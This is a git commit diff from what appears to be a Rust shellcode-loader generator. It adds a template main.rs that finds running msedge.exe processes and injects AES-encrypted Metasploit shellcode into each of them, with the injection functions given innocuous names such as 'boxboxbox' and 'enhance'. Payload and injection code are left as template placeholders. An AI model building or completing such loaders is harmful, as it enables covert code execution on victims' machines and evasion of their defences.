798e48cfeb68644b862366eadaa26bb046c1e01c
Nariod <dorian.p@protonmail.ch>
2022-09-21 18:59:58 +0200

    Start to puzzle up

--- src/puzzle.rs
+++ src/puzzle.rs
@@ -1,4 +1,5 @@
 // file that handle the target Rust code puzzle :)
+use std::path::Path;
 
 struct Order {
     shellcode: Vec<u8>,
@@ -17,7 +18,16 @@ enum Encryption {
     Aes,
 }
 
+fn string_reader_from_file(path: &Path) -> Result<String, Box<dyn std::error::Error>> {
+    let content = std::fs::read_to_string(path)?;
+    Ok(content)
+}
 
 pub fn meta_puzzle() {
     println!("meta_puzzle TBD");
+    let path_to_main = Path::new("template/src/main.rs");
+    match string_reader_from_file(path_to_main) {
+        Ok(content) => println!("{}",content),
+        Err(err) => panic!("{:?}", err),
+    }
 }
--- template/src/main.rs
+++ template/src/main.rs
@@ -4,10 +4,42 @@
 
 {{payload_decrypt}}
 
-{{process_finder}}
 
-{{process_inject}}
+fn boxboxbox(tar: &str) -> Vec<u32> {
+    // search for processes to inject into
+    let mut dom: Vec<u32> = Vec::new();
+    let s = System::new_all();
+    for pro in s.processes_by_exact_name(tar) {
+        //println!("{} {}", pro.pid(), pro.name());
+        dom.push(pro.pid().as_u32());
+    }
+    return dom;
+}
+
+fn enhance(buf:&[u8], tar:&u32) {
+    // injecting in target processes :)
+    println!("[+] Targeting {}", tar);
+
+    {{process_inject}}
+
+}
 
 fn main() {
-    {{obf_shellcode}}
+    // inject in the following processes:
+    let tar: &str = "msedge.exe";
+
+    // aes encrypted msf shellcode :
+    let enc_buf: {{obf_shellcode}}
+
+    let list:Vec<u32> = boxboxbox(tar);
+    if list.len() == 0 {
+        panic!("[-] Unable to find a process.")
+    }
+    else {
+        // thanks again to https://github.com/memN0ps/arsenal-rs/blob/ee385df07805515da5ffc2a9900d51d24a47f9ab/obfuscate_shellcode-rs/src/main.rs
+        for i in &list {
+            println!("[+] Found process {}", i);
+            enhance(&buf, i);
+        }
+    }
 }
